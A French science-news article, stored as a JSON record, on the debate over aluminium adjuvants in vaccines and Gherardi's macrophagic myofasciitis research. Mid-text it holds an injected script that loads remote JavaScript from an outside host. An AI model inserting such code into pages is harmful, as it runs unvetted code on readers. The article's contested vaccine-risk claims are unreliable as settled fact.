{"title": "Sels d'aluminium dans les vaccins : faut-il s'en inquieter ? (MAJ)", "newspaper": "Futura Sciences", "author": ["Par la redaction de Futura"], "date_publi": "2017-09-22", "content": "En mars 2017, un rapport du conseil scientifique de l'ANSM (agence nationale de securite du medicament et des produits de sante) demandait d'approfondir la question de l'aluminium dans les vaccins. Ce rapport reste confidentiel refait surface aujourd'hui suite a des revelations dans  Le Parisien . Les  vaccins  contiennent des adjuvants qui servent a stimuler la production d'anticorps par l'organisme. Des sels d' aluminium  sont souvent presents dans ces adjuvants. Mais, depuis plusieurs annees, la question de la securite de ces adjuvants est posee. C'est pourquoi l'ANSM a confie a Romain Gherardi, chef de service a l'hopital Henri-Mondor (Creteil), une etude sur eux. Le professeur Gherardi a deja alerte l'opinion publique sur les risques lies a l'aluminium dans les vaccins (voir ci-dessous). D'apres lui, l'aluminium pourrait favoriser l'apparition d'une maladie, la  myofasciite a macrophages . Cette maladie se manifeste par des douleurs, de la fatigue et des troubles de la cognition.  Ce nouveau rapport, que  Le Parisien  s'est procure, met en evidence l'existence d'une predisposition chez certaines personnes qui developpent cette maladie : sept genes seraient surrepresentes chez les malades. Dans son rapport, l'ANSM preconisait d'etudier cette question de plus pres :  << Des approfondissements sont necessaires >>.  Mais le probleme du financement des etudes complementaires ne semble pas regle...  Pour en savoir plus Article de Paris-AFP paru le 15 novembre 2012 Des scientifiques affirment que les sels d'aluminium qui entrent dans la composition des vaccins pourraient avoir des effets nefastes pour la sante. De plus en plus d'etudes semblent montrer que le  metal  ne se dissoudrait pas comme on le pensait dans l'organisme mais qu'il s'accumulerait dans le  systeme nerveux central , causant une  maladie rare  appelee myofasciite a  macrophages . Des chercheurs ont appele lundi 12 novembre a la poursuite des recherches sur la nocivite des sels d' aluminium  employes comme adjuvants dans la grande majorite des vaccins. Technique utilisee depuis des annees, l'ajout d'une tres petite dose d'aluminium dans les  vaccins  a pour role de stimuler la  reaction immunitaire . Mais alors qu'on pensait que l'aluminium se dissolvait spontanement dans les tissus et n'avait pas d'effet toxique, des etudes commencent a demontrer le contraire. << Les etudes experimentales ont montre qu'une partie de l'aluminium injecte dans le muscle circule dans l'organisme et est capable de gagner en faible quantite le systeme nerveux central ou il va s'accumuler >> , a indique Romain Gherardi, un specialiste des maladies neuromusculaires a l' hopital Henri Mondor  de Creteil, au cours d'une conference de presse.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des vaccins qui causent des myofasciites a macrophages ? Les travaux menes depuis la fin des annees 1990 par Romain Gherardi ont permis d'identifier une nouvelle  pathologie , la myofasciite a macrophages, une  inflammation  grave des muscles qui se traduit par des douleurs musculaires et articulaires et une forte fatigue, chez des personnes genetiquement predisposees. Les  symptomes , etudies chez 585 adultes, apparaissent en moyenne 11 mois apres l'inoculation du  vaccin , selon Romain Gherardi. Il estime qu'ils pourraient toucher jusqu'a 5 % de la population, alors meme que le nombre de  vaccins recommandes  ne cesse d'augmenter, avec pres de 200 produits en developpement. Dans le cas de la myofasciite a macrophages, dont on suspecte les hydroxydes d'aluminium d'etre a l'origine, les macrophages, ces cellules du systeme immunitaire a l'image, s'infiltrent dans le tissu musculaire alors qu'elles n'ont pas a y etre. Cela entraine fatigue, fievre ou troubles neurologiques. (c) Obli, Wikipedia, cc by sa 2.0                               Mais l'Agence nationale de securite du medicament et des produits de sante ( ANSM ) a annonce le mois dernier qu'elle ne financerait pas la poursuite de ses travaux sur les adjuvants a l'aluminium, suscitant notamment une vive emotion aupres de l'association de malades atteints de myofasciite a macrophages ( E3M ). Les recherches de Romain Gherardi ne font pas l'unanimite. Certains experts relevent qu'aucune relation de cause a effet n'a encore ete demontree, d'autres considerent que les soupcons qui planent sur les sels d' aluminium  sont suffisamment graves. Un moratoire contre les vaccins aux sels d'aluminium ? <<  Il y a un manque de connaissance sur l'aluminium   >> , a reconnu au cours de la conference de presse Christopher Exley, un biochimiste britannique qui travaille sur l'aluminium depuis plus de 20 ans. On ne sait pas aujourd'hui, souligne-t-il, ce que peut provoquer  <<   une exposition lente et consistante a l'aluminium pendant des annees   >>  et  <<  on peut se demander   >>  si des  maladies neurologiques  auto-immunes comme la  sclerose en plaques  ne seraient pas, elles aussi, liees a l'aluminium. En attendant des recherches plus poussees, la deputee europeenne Michele Rivasi (EELV) a reclame un  moratoire  sur tous les  vaccins  contenant de l'aluminium, comme l'avait deja fait en mars dernier un groupe d'etudes de l'Assemblee nationale, en  application  du  principe de precaution . L'Academie nationale de medecine avait reconnu en juin que de l'aluminium pouvait penetrer dans le  cerveau  mais s'etait declaree hostile a tout moratoire, estimant que celui-ci rendrait impossible la majorite des  vaccinations  alors que des solutions de rechange ne pourraient etre pretes que dans 5 ou 10 ans. Andre Cicolella, president du Reseau environnent sante (RES), a denonce lundi la  <<  position obscurantiste  >>  des autorites sanitaires qui tendent a  <<   marginaliser les experts  >> . <<  Tant que les agences gouvernementales ne convaincront pas la population que tout est mis en oeuvre pour explorer toutes les pistes, tous les signaux d'alarme, la population votera avec ses pieds et ira de moins en moins se faire  vacciner  >>  a regrette Romain Gherardi. La coqueluche, une maladie encore trop souvent mortelle                       La coqueluche fait partie des maladies les plus difficiles a eliminer. Elle peut devenir mortelle dans certains cas, si elle infecte des personnes fragiles comme les nourrissons et les seniors. L'Institut Pasteur travaille donc au quotidien pour trouver des solutions qui enraieraient la maladie. Nicole Guiso, responsable du Centre national de reference de la coqueluche et autres bordetelloses, nous en parle au cours de cette interview.                                       ", "theme": "sante"}